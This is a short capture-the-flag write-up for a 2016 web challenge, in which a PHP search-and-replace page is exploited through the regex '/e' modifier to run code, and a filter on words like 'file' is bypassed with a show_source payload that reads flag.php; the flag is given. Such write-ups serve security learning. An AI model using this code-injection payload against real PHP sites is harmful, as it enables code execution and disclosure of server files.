---
title: 'Internetwache CTF 2016: Replace with Grace (web 60)'
date: 2016-02-22 00:00:00 Z
categories:
- writeup
tags:
- cat/web
- lang/php
layout: post
author: sigttou
---

* **Category:** web
* **Points:** 60
* **Description:** 

> Regular expressions are pretty useful. Especially when you need to search and replace complex terms.

## Write-up

The given website is used to "Search & Replace" with regular expressions.
From other challenges we know, that we can execute php code using:

```php
/(.*)/e
```

(Check out [this Stackoverflow answer](http://stackoverflow.com/a/16986549/1518225) for details.)

The problem was, that the website filtered some inputs like:

* file
* open


It worked with:

```
var_dump(show_source('flag.php'));
```

A simple, but nice challenge.

```
IW{R3Pl4c3_N0t_S4F3}
```
